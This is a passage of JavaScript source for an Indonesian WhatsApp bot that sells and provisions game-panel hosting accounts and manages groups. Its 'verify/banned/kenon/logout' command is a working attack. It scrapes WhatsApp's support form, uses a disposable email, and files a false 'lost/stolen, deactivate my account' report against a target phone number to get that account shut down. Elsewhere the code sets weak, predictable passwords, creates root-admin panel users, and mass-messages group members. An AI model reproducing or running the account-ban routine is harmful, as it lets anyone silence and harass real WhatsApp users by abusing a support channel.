{title: " OVO", rowId: prefix+"ovo", description: "Tidak tersedia"},
{title: " GOPAY", rowId: prefix+"gopay", description: "blomtersedia"},
{title: " QRIS", rowId: prefix+"qris", description: "Tersedia Payment Qris Allpay"},
{title: " DANA", rowId: prefix+".dana", description: "Tersedia payment dana"},
{title: " PULSA", rowId: prefix+".888888", description: "Belum Tersedia"}]},
],
footer: 'DiansHost',
mentions:[global.author, sender]})
  }
      break
        case 'bukti':{
m.reply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT ADA KENDALA/DEPOSIT BELOM DI KONFIRMASI BISA CHAT OWNER DI BAWAH.')
DiansHost.sendMessage('62895328298685@s.whatsapp.net', { text: `*ADA YANG DEPOSIT NIH*\n\n*@${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
        }
        break
    case 'verify': case 'banned': case 'kenon': case 'logout': {
 if (!isCreator) return m.reply(`Khusus Owner`)
 if (!q) return m.reply(`Targetnya?`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
m.reply(`succes ${command} ke nomer tersebut\n
note :
jika no masih centang 2 atau aktif no tersebut sudah terkena ${command} sebelumnya....`)
}
 
        break
case 'couple': {
if (!isCreator) return m.reply('Ente Siapa?')
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
DiansHost.sendMessage(from, { image: { url: random.male }, caption: `Ini Untuk Cowo` }, { quoted:m })
DiansHost.sendMessage(from, { image: { url: random.female }, caption: `Ini Untuk Cewenya><` }, { quoted:m })
}
        break

 case "crateadmin": {
if (!isCreator) return m.reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
if (!isCreator) return m.reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {

"method": "POST",

"headers": {

"Accept": "application/json",

"Content-Type": "application/json",

"Authorization": "Bearer " + apikey

},

"body": JSON.stringify({

"email": username + "@gmail.com",

"username": username,

"first_name": username,

"last_name": "Memb",

"language": "en",

 "root_admin" : true,  

"password": password.toString()

})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

ID: ${user.id}
UUID: ${user.uuid}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
LANGUAGE: ${user.language}
ADMIN: ${user.root_admin}
CREATED AT: ${user.created_at}

LOGIN: ${domain}
`

const sections = [

    {

        title: ` *DiansHost* `,

                rows: [

                {title: `PAKET 1GB CPU 100%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,1000/1000,100`,description: "CRATE PAKET 1GB CPU 100%"},

                {title: `PAKET 2GB CPU 200%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,2000/2000,200`,description: "CRATE PAKET 2GB CPU 200%"},

                {title: `PAKET 3GB CPU 300%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,3000/3000,300`,description: "CRATE PAKET 3GB CPU 300%"},    

                {title: `PAKET 4GB CPU 400%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,4000/4000,400`,description: "CRATE PAKET 4GB CPU 400%"},   

                {title: `PAKET 5GB CPU 500%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,5000/5000,580`,description: "CRATE PAKET 5GB CPU 500%"},    

                {title: `PAKET 6GB CPU 680%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,6000/6000,600`,description: "CRATE PAKET 6GB CPU 600%"},   

                {title: `PAKET 7GB CPU 700%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,7000/7000,700`,description: "CRATE PAKET 7GB CPU 700%"},   

                {title: `PAKET 8GB CPU 800%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,8000/8000,800`,description: "CRATE PAKET 8GB CPU 800%"},    

                {title: `PAKET UNLI & CPU UNLI`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,0/0,0`,description: "CRATE PAKET UNLI & CPU UNLI"},   

                                             

]}]

    const listMessage = {

        text: tks,

        footer: "DiansHost",

        title: "*SUCCESSFULLY ADD USER ADMIN*",

        buttonText: "Click Here!",

        sections

    }

	

    await DiansHost.sendMessage(m.chat, listMessage)

    await DiansHost.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
case "setdesc": case "setdesk": {
if (!isGroup) return m.reply(`Harus Di Group Masbro`)
if (!isBotAdmins) return m.reply(`Lu Kira Gw Admin?`)
if (!isAdmins) return m.reply(`Fitur Ini Khusu Admin Njer`)
if (!text) return m.reply("Mau Diubah Jadi Apa?")
await DiansHost.groupUpdateDescription(m.chat, text).then((res) => m.reply(`Sukses mengganti deskripsi group dengan ${text}`)).catch((err) => m.reply(jsonformat(err)))
}
     break
  case 'tagall': case 'infoall':
if (!isGroup) return m.reply(`Harus Di Group Masbro`)
  if (!isGroupAdmins) return msg.reply(mess.admin)
  let tekss = `*PENGUMUMAN *\n\n*Pesan : ${q ? q : 'Nothing'}*\n\n`
  for (let mem of participants) {
  tekss += ` @${mem.id.split('@')[0]}\n`
  }
  tekss += `\n*DiansHost PEDIA*`
  DiansHost.sendMessage(m.chat, { text: tekss, mentions: participants.map(a => a.id) }, { quoted: m })  
      break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
            m.reply(`Load banh`)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await DiansHost.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await DiansHost.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
}
        break
case 'qris': {
DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/346247b17acff40e5bb82.jpg' }, caption: `JAN LUPA SS BUKTI YAH | example : .bukti` }, { quoted: m })
} 
        break
case 'dana': {
DiansHost.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/065a82d505e0136d6c49e.jpg' }, caption: `JAN LUPA SS BUKTI YAH example : .bukti` }, { quoted: m })
}
        break

case "detsrv": {

let srv = args[0]

let f = await fetch(domain + "/api/application/servers/" + srv, {

"method": "GET",

"headers": {

"Accept": "application/json",

"Content-Type": "application/json",

"Authorization": "Bearer " + apikey

}

})

let res = await f.json();

if (res.errors) return m.reply('*SERVER NOT FOUND*')

let s = res.attributes

let f2 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {

"method": "GET",

"headers": {

"Accept": "application/json",

"Content-Type": "application/json",

"Authorization": "Bearer " + capikey

}

})

let data = await f2.json();

let t = data.attributes

m.reply(`*${s.name.toUpperCase()} SERVER DETAILS*

STATUS: ${t.current_state}

ID: ${s.id}

UUID: ${s.uuid}

NAME: ${s.name}

DESCRIPTION: ${s.description}

MEMORY: ${await (format(t.resources.memory_bytes)).toString()} / ${s.limits.memory === 0 ? 'Unlimited' : s.limits.memory + 'MB'}

DISK: ${await (format(t.resources.disk_bytes)).toString()} / ${s.limits.disk === 0 ? 'Unlimited' : s.limits.disk + 'MB'}

CPU: ${t.resources.cpu_absolute}% / ${s.limits.cpu === 0 ? 'Unlimited' : s.limits.cpu + '%'}

CREATED AT: ${s.created_at}`)

}
       
        break

case 'setnama': case 'setsubject': {

                if (!isGroup) throw mess.group

                if (!isBotAdmins) throw mess.botAdmin

                if (!isAdmins) throw mess.admin

                if (!text) throw 'Text ?'

                await DiansHost.groupUpdateSubject(m
.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))

            }
        break

case "detusr": {

if (!isCreator) return m.reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)

let usr = args[0]

let f = await fetch(domain + "/api/application/users/" + usr, {

"method": "GET",

"headers": {

"Accept": "application/json",

"Content-Type": "application/json",

"Authorization": "Bearer " + apikey

}

})

let res = await f.json()

if (res.errors) return m.reply('*USER NOT FOUND*')

let u = res.attributes

m.reply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}

UUID: ${u.uuid}

USERNAME: ${u.username}

EMAIL: ${u.email}

NAME: ${u.first_name} ${u.last_name}

LANGUAGE: ${u.language}

ADMIN: ${u.root_admin}

CREATED AT: ${u.created_at}\`\`\``)

}
        
       
        break
 case "addusr": {
     if (!isSeler) return m.reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
if (!isSeler) return m.reply(mess.owner)
let t = text.split(',');
if (t.length < 3) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await DiansHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let tks = `
*SUCCESSFULLY ADD USER*

TYPE: user

ID: ${user.id}
UUID: ${user.uuid}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
LANGUAGE: ${user.language}
ADMIN: ${user.root_admin}
CREATED AT: ${user.created_at}

LOGIN: ${domain}

*Password telah dikirim di private chat @${u.split`@`[0]}*`

const sections = [
    {
        title: ` *DiansHost* `,
                rows: [
                {title: `PAKET 1GB CPU 100%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,1000/1000,100`,description: "CRATE PAKET 1GB CPU 100%"},
                {title: `PAKET 2GB CPU 200%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,2000/2000,200`,description: "CRATE PAKET 2GB CPU 200%"},
                {title: `PAKET 3GB CPU 300%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,3000/3000,300`,description: "CRATE PAKET 3GB CPU 300%"},    
                {title: `PAKET 4GB CPU 400%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,4000/4000,400`,description: "CRATE PAKET 4GB CPU 400%"},   
                {title: `PAKET 5GB CPU 500%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,5000/5000,500`,description: "CRATE PAKET 5GB CPU 500%"},    
                {title: `PAKET 6GB CPU 600%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,6000/6000,6000`,description: "CRATE PAKET 6GB CPU 600%"},   
                {title: `PAKET 7GB CPU 700%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,7000/7000,700`,description: "CRATE PAKET 7GB CPU 700%"},   
                {title: `PAKET 8GB CPU 800%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,8000/8000,800`,description: "CRATE PAKET 8GB CPU 800%"},    
                {title: `PAKET UNLI & CPU UNLI`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,0/0,0`,description: "CRATE PAKET UNLI & CPU UNLI"},   
                                             
]}]

    const listMessage = {
        text: tks,
        footer: "DiansHost",
        title: "*SUCCESSFULLY ADD USER*",
        buttonText: "Click Here!",
        sections
    }
	
    await DiansHost.sendMessage(m.chat, listMessage)
    await DiansHost.sendMessage(u, {
        text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n

 *USERNAME* : ${username}
 *PASSWORD* : ${password}
 *LOGIN* : ${domain}

*NOTE*
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
-----------------------------------
`,

    })
} 
        break
case "setppbot": {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await DiansHost.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await DiansHost.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await DiansHost.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
        break
case "delusr": {
  if (!isCreator) return m.reply(`KHUSUS OWNER`)
if (!isCreator) return m.reply(mess.owner)
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
case "addsrv": {
if (!isCreator) return m.reply(`KHUSUS CREATOR BOT`)
if (!isCreator) return m.reply(mess.owner)
let s = text.split(',');
if (s.length < 7) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
case "delsrv": {
      if (!isCreator) return m.reply(`KHUSUS OWN `)

if (!isCreator) return m.reply(mess.owner)
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*SERVER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
case 'pushkontak': {
 if (!isCreator) return m.reply(`KHUSUS OWNERi`)
    if (!isCreator) return 
      if (!isGroup) return m.reply(`Digrup Bang`)
    if (!q) return m.reply(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    m.reply(`Succes Get Member`)
    for (let pler of mem) {
    DiansHost.sendMessage(pler, { text: q})
     }
     m.reply(`Succes Push Kontak`)
}
break
case 'hidetag': case 'ht': {
if (!m.isGroup) return m.reply(mess.group)
if (!isCreator) return m.reply(`Lu siapa kocak`)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!q) return m.reply(`Teks?`)
DiansHost.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'resetlinkgc': case 'resetgc': case 'DiansHostrl':
if (!isCreator) return m.reply('Lu Bukan DiansHost Asu')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await DiansHost.groupRevokeInvite(from)
.then( res => {
m.reply(`Link Gc Beres Gua Reset`)
})
break
 case "menu2":
txm = `[    ]
`
let buttons = [
    {buttonId: 'allmenu', buttonText: {displayText: 'TAMPILKAN SMUA MENU'}, type: 2},
    {buttonId: 'webpanel', buttonText: {displayText: 'TAMPILKAN LINK SERVER'}, type: 2},
    {buttonId: 'owner', buttonText: {displayText: 'OWNER'}, type: 2}
  ]
  
  let buttonMessage = {
      text: txm,
      footer: 'DiansHost',
      buttons: buttons,
      headerType: 1
  }
  DiansHost.sendMessage(from, buttonMessage,  { quoted: m })
break

break
case 'kick': {
if (!isCreator) return m.reply('Khusus creator bot')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DiansHost.groupParticipantsUpdate(from, [users], 'remove')
}
break
case 'sendlinkgc': case 'sendgc': {
if (!isCreator) return m.reply('Lu Bukan DiansHost Bodoh')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285871019341`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await DiansHost.groupInviteCode(from)
DiansHost.sendText(bnnd, `Order  Akses Bot? Join Gc\nhttps://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
sticSukses(from)
}
  break
case 'id':{
            m.reply(from)
}
       
break
case "panel":
txh = ` *DiansHost*
${kini}BY DiansHost

CARA ADD USER PANEL :
ram user,nomer

contoh : 1gb rzl,62895328298685${kini}
`
let buttons1 = [
    {buttonId: 'ramlist', buttonText: {displayText: 'RAM YANG TERSEDIA'}, type: 2},
    {buttonId: 'menu', buttonText: {displayText: 'BACK TO MENU'}, type: 2}
  ]
  
  let buttonMessage1 = {
      text: txh,
      footer: 'DiansHost',
      buttons: buttons1,
      headerType: 1
  }
DiansHost.sendMessage(from, buttonMessage1, {quoted:m})
break
case "ramlist":

lrm = `${kini}RAM YANG TERSEDIA :
1GB 
2GB 
3GB 
4GB 
5GB 
UNLI (KHUSUS ADMIN SERVER)${kini}`
DiansHost.sendMessage(from, {text : lrm}, {quoted : m})
break
        case "daftar":
lrm = `${kini}SILAHKAN CONTACT ADMIN :
https://wa.me/62895328298685${kini}`
DiansHost.sendMessage(from, {text : lrm}, {quoted : m})
break
case "rulesseler":

lerm = `RULES RESSELER DiansHost XD
BAGI HASIL WAJIB 50 : 50 DENGAN OWNER
`
DiansHost.sendMessage(from, {text : lerm}, {quoted : m})
break

case "webpanel": 
m.reply(`Hadeh`)
break
case "listusr": {
if (!isCreator) return m.reply(`Mau liat user?`)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let users = res.data
let sections = []
for (let user of users) {
let u = user.attributes
let obj = {
title: "-- PANEL --",
rows: [
{ title: `${u.id}. ${u.username}`, rowId: `${prefix}detusr ` + u.id, description: u.first_name + ' ' + u.last_name },
]
}
await sections.push(obj)
if (sections.length === 50) {
sections.push({
title: "-- PANEL --",
rows: [
{ title: ` NEXT`, rowId: `${prefix}listusr 2`, description: 'Page 2' },
{ title: ` NEXT`, rowId: `${prefix}listusr 3`, description: 'Page 3' },
{ title: ` NEXT`, rowId: `${prefix}listusr 4`, description: 'Page 4' },
{ title: ` NEXT`, rowId: `${prefix}listusr 5`, description: 'Page 5' },
]
})
}
}
await DiansHost.sendMessage(m.chat, {
text: "Berikut list user ",
footer: `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`,
title: " ",
buttonText: `${res.meta.pagination.count} Users`,
sections
},{ quoted : m })
}
break
case "listsrv": {
if (!isCreator) return m.reply(`Mau liat server?`)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data
let sections = []
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let obj = {
title: "-- PANEL --",
rows: [
{ title: `${s.id}. ${s.name}`, rowId: `${prefix}detsrv ` + s.id, description: `Status: ${data.attributes ? data.attributes.current_state : s.status}` },
]
}
await sections.push(obj)
if (sections.length >= 50 && res.meta.pagination.links.next) {
sections.push({
title: "-- PANEL --",
rows: [
{ title: ` NEXT`, rowId: `${prefix}listsrv 2`, description: 'Page 2' },
{ title: ` NEXT`, rowId: `${prefix}listsrv 3`, description: 'Page 3' },
{ title: ` NEXT`, rowId: `${prefix}listsrv 4`, description: 'Page 4' },
{ title: ` NEXT`, rowId: `${prefix}listsrv 5`, description: 'Page 5' },
]
})
}
}
await DiansHost.sendMessage(m.chat, {
text: "Berikut list server *PANEL*",
footer: `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`,
title: "*PANEL*",
buttonText: `${res.meta.pagination.count} Servers`,
sections
}, { quoted: m })
}
break
case 'add':
 if (!isCreator) return m.reply(`Hadehh`)
        
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await DiansHost.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./config/seller.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break
case 'del':
    if (!isCreator) return m.reply(`Siapa si lu?`)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(bnnd)
owner.splice(unp, 1)
fs.writeFileSync('./config/seller.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Sudah Tidak Bisa Add Server`)
break

        case "1gb": {
    if (!isSeler) return m.reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/86a66c629f5747bebd5aa.jpg" 
if (!u) return
let d = (await DiansHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY DiansHost 

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *USERNAME* : ${user.username}
 *PASSWORD* : ${password}
 *LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
DiansHost.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DiansHost.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
            
 DiansHost
`)

}

break
case "2gb": {
    if (!isSeler) return m.reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/86a66c629f5747bebd5aa.jpg" 
if (!u) return
let d = (await DiansHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
